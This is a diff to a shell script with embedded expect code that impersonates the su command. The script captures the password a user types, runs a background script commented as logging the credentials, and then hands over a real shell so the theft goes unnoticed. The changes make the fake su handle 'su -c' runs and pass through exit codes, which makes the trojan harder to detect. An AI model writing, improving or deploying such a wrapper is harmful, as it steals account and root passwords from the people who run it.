@@ -129,6 +129,9 @@ exec expect -c '
         timeout { exec sh -c "rm -f $tmplog $tmpsh" ; exit 1 }
     }
 
+    # Show output from here on (shell prompt, command output, errors)
+    log_user 1
+
     set timeout 2
     expect {
         -nocase -re {(Authentication failure|incorrect password|su: )} {
@@ -137,16 +140,18 @@ exec expect -c '
             exit 1
         }
         eof {
-            exec sh -c "rm -f $tmplog $tmpsh"
-            exit 1
+            # Process exited after password was sent — normal for su -c
+            # Log creds and exit with the spawned processs exit code
+            catch { exec sh $tmpsh & }
+            set result [wait]
+            exit [lindex $result 3]
         }
         timeout {
+            # No error within 2s — auth succeeded for interactive shell
             catch { exec sh $tmpsh & }
         }
     }
 
-    send "\r"
     set timeout -1
     interact
-    exit 0
 ' "$TMPLOG" "$TMPSH" "$REAL_SU" "$@" 2>/dev/null
